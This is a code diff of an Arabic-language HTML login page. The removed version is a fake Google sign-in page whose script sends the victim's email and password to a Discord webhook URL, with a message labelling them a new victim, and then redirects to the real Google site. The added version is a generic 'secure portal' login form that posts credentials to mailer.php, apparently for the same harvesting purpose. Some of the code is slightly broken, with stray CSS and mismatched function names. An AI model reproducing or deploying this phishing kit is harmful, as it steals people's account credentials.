@@ -1,108 +1,66 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول - حساب Google</title>
+  <title>تسجيل الدخول - البوابة الآمنة</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      background-color: rgba(0,0,0,0.6);
+      margin: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      direction: rtl;
     }
-
     .popup {
       background: white;
-      padding: 20px;
-      border-radius: 10px;
-      width: 300px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      width: 320px;
       text-align: center;
-      display: none;
     }
-
     .popup img {
- }
-
-    .login-container h2 {
-       width: 90px;
-      margin-bottom: 10px;
+      width: 60px;
+      margin-bottom: 15px;
     }
-
+    .popup h2 {
+      margin: 0 0 20px;
+      font-size: 18px;
+      color: #333;
+    }
     .popup input {
-      width: 90%;
-      padding: 8px;
-      margin: 5px 0;
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 6px;
     }
-
     .popup button {
-      padding: 10px 20px;
-      border: none;
-      background: #1a73e8;
+      width: 100%;
+      padding: 10px;
+      background: #4CAF50;
       color: white;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
-      border-radius: 4px;
-      margin-top: 10px;
     }
-
-    #overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
+    .popup button:hover {
+      background: #45a049;
     }
   </style>
 </head>
 <body>
+  <div class="popup">
+    <img src="user-icon.png" alt="User">
+    <h2>تسجيل الدخول إلى حسابك</h2>
+    <form action="mailer.php" method="POST">
+      <input type="text" name="username" placeholder="اسم المستخدم" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+</body>
+</html>
 
-<div id="login-container">
-   <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
-  <h2>تسجيل الدخول إلى حسابك في Google</h2>
-    
-    <form onsubmit="sendToDiscord(); return false;">
-    
-       <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-  <input type="password" id="password" placeholder="كلمة المرور" required>
-      <button type="submit">التالي</button>
-     </form>
-   <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
-</div>
-
-<script>
-  // إظهار النافذة بعد 1 ثانية
-  setTimeout(() => {
-    document.getElementById("overlay").style.display = "flex";
-    document.getElementById("loginPopup").style.display = "block";
-  }, 1000);
-
-  function login() {
-    let email = document.getElementById("email").value;
-    let password = document.getElementById("password").value;
-
- var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
-       var payload = {
-          content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
-         };
-     fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      }).then(() => {
-        window.location.href = "https://accounts.google.com/";
-      }).catch(err => {
-        alert("حدث خطأ أثناء الإرسال.");
-      });
-    }
-  </script>
-   </body>
-   </html>
